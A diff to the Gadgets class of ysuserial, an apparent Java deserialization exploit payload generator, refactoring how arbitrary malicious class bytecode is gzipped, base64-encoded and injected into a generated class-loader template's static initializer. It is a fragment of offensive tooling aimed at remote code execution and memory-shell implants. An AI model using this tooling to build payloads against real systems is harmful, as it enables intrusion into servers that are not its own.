@@ -7,10 +7,8 @@ import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
 import static org.su18.ysuserial.payloads.util.Utils.*;
 
-import java.io.ByteArrayOutputStream;
 import java.lang.reflect.*;
 import java.util.*;
-import java.util.zip.GZIPOutputStream;
 
 import javassist.*;
 
@@ -266,20 +264,7 @@ public class Gadgets {
 
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
 		if (bytes != null) {
-			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
-			ctClass.setName(generateClassName());
-			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
-			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
-			gzipOutputStream.write(bytes);
-			gzipOutputStream.close();
-			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
-			String className = "className=\"" + cName + "\";";
-			ctClass.makeClassInitializer().insertBefore(content);
-			ctClass.makeClassInitializer().insertBefore(className);
-
-			if (IS_INHERIT_ABSTRACT_TRANSLET) {
-				ctClass.setSuperclass(superClass);
-			}
+			ctClass = encapsulationByClassLoaderTemplate(bytes, cName, IS_INHERIT_ABSTRACT_TRANSLET ? superClass : null);
 		}
 
 
